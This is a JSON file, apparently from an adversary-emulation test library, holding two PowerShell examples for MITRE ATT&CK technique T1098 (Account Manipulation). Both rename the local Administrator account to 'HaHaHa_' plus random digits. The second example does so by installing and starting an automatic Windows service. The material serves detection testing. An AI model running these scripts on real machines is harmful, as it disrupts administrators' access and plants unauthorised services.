{
  "Account Manipulation": {
	  "MITRE ATT&CK Technique:": "[T1098](https://attack.mitre.org/wiki/Technique/T1098)",
    "Example 1": "If successful, the Administrator account will be renamed with `HaHaHa_` followed by 4 to 16 digits.\n\n$x = Get-Random -Minimum 2 -Maximum 9999\n$y = Get-Random -Minimum 2 -Maximum 9999\n$z = Get-Random -Minimum 2 -Maximum 9999\n$w = Get-Random -Minimum 2 -Maximum 9999\nWrite-Host HaHaHa_$x$y$z$w\n\n$hostname = (Get-CIMInstance CIM_ComputerSystem).Name\n\n$fmm = Get-CimInstance -ClassName win32_group -Filter \"name = 'Administrators'\" | Get-CimAssociatedInstance -Association win32_groupuser | Select Name\n\nforeach($member in $fmm) {\n    if($member -like \"*Administrator*\") {\n        Rename-LocalUser -Name $member.Name -NewName \"HaHaHa_$x$y$z$w\"\n        Write-Host \"Successfully Renamed Administrator Account on\" $hostname\n        }\n    }\n",
    "Example 2": "If successful, the Administrator account will be renamed with `HaHaHa_` followed by 4 to 8 digits.\n\n$x = Get-Random -Minimum 2 -Maximum 99\n$y = Get-Random -Minimum 2 -Maximum 99\n$z = Get-Random -Minimum 2 -Maximum 99\n$w = Get-Random -Minimum 2 -Maximum 99\n$newadmin = \"HaHaHa_$x$y$z$w\".ToString()\n\n$serviceName = \"Rename Account Service\"\n$serviceDisplayName = \"Rename Account Service\"\n$serviceDescription = \"Rename Account Service\"\n$serviceExecutable = \"wmic useraccount where name='Administrator' rename '$newadmin'\"\n\nif (Get-Service $serviceName -ErrorAction SilentlyContinue)\n{\n    $serviceToRemove = Get-WmiObject -Class Win32_Service -Filter \"name='$serviceName'\"\n    $serviceToRemove | Stop-Service\n    $serviceToRemove.delete()\n}\nelse\n{\n    \"service does not exists\"\n}\n\nWrite-Host \"Installing service: $serviceName\"\nNew-Service -name $serviceName -displayName $serviceDisplayName -binaryPathName $serviceExecutable -startupType Automatic -Description $serviceDescription\nWrite-Host \"Installation completed: $serviceName\"\n\nWrite-Host \"Trying to start new service: $serviceName\"\n\n$serviceToStart = Get-WmiObject -Class Win32_Service -Filter \"name='$serviceName'\"\n$serviceToStart.startservice()\nWrite-Host \"Service started: $serviceName\""
  }
}
